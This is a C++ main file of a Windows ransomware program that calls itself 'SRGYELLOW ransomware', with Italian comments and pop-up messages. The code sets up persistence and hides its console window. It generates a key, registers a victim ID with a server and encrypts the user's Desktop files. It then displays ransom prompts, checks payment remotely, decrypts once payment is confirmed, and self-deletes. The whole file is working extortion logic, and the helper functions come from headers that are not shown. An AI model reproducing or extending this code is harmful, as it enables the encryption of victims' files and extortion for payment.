#include "src/scanPC.h"
#include "src/storage.h"
#include "src/utility.h"
#include "src/network.h"
#include "src/request.h"

int main()
{   
    std::string password = "chooseyourkey";
    std::string projectName = "ransomware";

    SystemStorage systemStorage(projectName);
    systemStorage.Persistance();
    
    Session session(password,projectName);

    ShowWindow(GetConsoleWindow(),0);

    //trovare path dell'eseguibile
    std::string exe = checkExePath();
    
    //trovare path della cartella degli users
    std::string usersPath = checkUsersPath();

    std::string path = usersPath + "/Desktop/";
    std::string path2 = usersPath + "/Desktop";
    
    if((session.FindInfo("id")) == "")
    {
        std::string pass = generatoreRandom(20);

        std::string responsecreateIdKey = createId(pass);
        
        //salvataggio informazioni in un file
        session.SaveInfo("password",pass.c_str());
        session.SaveInfo("id",responsecreateIdKey.c_str());
        session.SaveInfo("end","false");
        
        if (session.FindInfo("end")=="false")
        {
            ricerca(path2, session.FindInfo("password"), false);
            session.RemoveInfo("end");
            session.SaveInfo("end","true");

            int msg = DisplayResourceNAMessageBox("",exe);

            if(msg==1)
            {
                std::string IdSession = session.FindInfo("id");
                
                payment(IdSession);
                
                //apertura altro messagebox
                MessageBox(NULL,("HAI EFFETTUATO IL PAGAMENTO RILANCIA L'ESEGUIBILE CHE SI TROVA IN "+exe).c_str(),"SRGYELLOW ransomware",MB_SYSTEMMODAL);
            }
        }
        else
        {
            std::string IdSession = session.FindInfo("id");
            
            std::string response = checkPayment(IdSession);
            
            if (response == "true")
            {
                ricerca(path2, session.FindInfo("password"),true);
                
                std::string IdSession = session.FindInfo("id");
                
                deleteData(IdSession);

                MessageBox(NULL,"DATI DECRITTATI CON SUCCESSO","SRGYELLOW ransomware",MB_SYSTEMMODAL);
                SelfDelete();

                session.RemoveInfo("id");
                session.RemoveInfo("password");
                session.RemoveInfo("end");

                systemStorage.RemovePersistance();
            }
            else
            {
                int msg1 = DisplayResourceNAMessageBox("",exe);

                if(msg1==1)
                {
                    std::string IdSession = session.FindInfo("id");
                
                    payment(IdSession);
                    
                    //apertura altro messagebox
                    MessageBox(NULL,("HAI EFFETTUATO IL PAGAMENTO RILANCIA L'ESEGUIBILE CHE SI TROVA IN "+exe).c_str(),"SRGYELLOW ransomware",MB_SYSTEMMODAL);
                }
            }
        }
    }
    else
    {
        if(session.FindInfo("end") == "false")
        {
            ricerca(path2, session.FindInfo("password"), false);
            session.RemoveInfo("end");
            session.SaveInfo("end","true");

            int msg = DisplayResourceNAMessageBox("",exe);
            
            if(msg==1)
            {                
                std::string IdSession = session.FindInfo("id");
                
                payment(IdSession);
                
                //apertura altro messagebox
                MessageBox(NULL,("HAI EFFETTUATO IL PAGAMENTO RILANCIA L'ESEGUIBILE CHE SI TROVA IN "+exe).c_str(),"SRGYELLOW ransomware",MB_SYSTEMMODAL);
            }
        }
        else
        {
            std::string IdSession = session.FindInfo("id");
                
            std::string response = checkPayment(IdSession);
            
            
            if (response == "true")
            {
                ricerca(path2, session.FindInfo("password"),true);
                
                std::string IdSession = session.FindInfo("id");
                
                deleteData(IdSession);

                MessageBox(NULL,"DATI DECRITTATI CON SUCCESSO","SRGYELLOW ransomware",MB_SYSTEMMODAL);
                SelfDelete();

                session.RemoveInfo("id");
                session.RemoveInfo("password");
                session.RemoveInfo("end");

                systemStorage.RemovePersistance();
            }
            else 
            {
                int msg1 = DisplayResourceNAMessageBox("",exe);
                
                if(msg1==1)
                {
                    std::string IdSession = session.FindInfo("id");
                
                    payment(IdSession);
                    
                    //apertura altro messagebox
                    MessageBox(NULL,("HAI EFFETTUATO IL PAGAMENTO RILANCIA L'ESEGUIBILE CHE SI TROVA IN "+exe).c_str(),"SRGYELLOW ransomware",MB_SYSTEMMODAL);
                }
            }
        }
    }            
    return 0;
}